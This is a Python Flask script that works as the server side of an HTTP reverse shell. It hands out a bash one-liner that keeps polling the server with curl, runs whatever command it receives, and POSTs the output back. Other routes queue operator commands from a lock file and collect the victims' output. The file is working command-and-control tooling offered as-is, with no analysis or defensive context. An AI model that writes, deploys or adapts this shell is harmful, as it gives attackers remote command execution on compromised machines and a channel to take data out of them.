#!/usr/bin/python3
# api.py

import os
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from config import HOSTNAME, REFRESH_DELAY
from flask import Flask, request


app = Flask(__name__)


@app.route('/', methods=['GET'])
def get_home():
    return '', 200


@app.route('/windows/', methods=['GET'])
def get_windows():
    return 'while :;do c=$(curl -s {hostname}/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s {hostname}/http_reverse_shell/ --data-urlencode "stdout=$($c)";sleep {delay};done'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200


@app.route('/linux/', methods=['GET'])
def get_linux():
    return 'while :;do c=$(curl -s {hostname}/http_reverse_shell/?ready=true);[ -n "$c" ]&&curl -X POST -s {hostname}/http_reverse_shell/ --data-urlencode "stdout=$($c)";sleep {delay};done'.format(hostname=HOSTNAME, delay=REFRESH_DELAY), 200


@app.route('/http_reverse_shell/', methods=['GET'])
def get_http_reverse_shell():
    if not request.args.get('ready'):
        if 'windows' in str(request.user_agent).lower():
            return get_windows()
        elif 'linux' in str(request.user_agent).lower():
            return get_linux()
        else:
            return get_linux()
    with open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'command.lock'), 'r+') as lock:
        command = lock.read().split('\n')[0]
        lock.seek(0)
        lock.truncate()
    return command, 200


@app.route('/http_reverse_shell/', methods=['POST'])
def post_http_reverse_shell():
    if request.form.get('stdout'):
        with open(os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'stdout.lock'), 'w') as lock:
            lock.write(request.form.get('stdout'))
        print(request.form.get('stdout'))
        return 'Success', 200
    return 'test', 200


if __name__ == '__main__':
    app.run('0.0.0.0', 80)
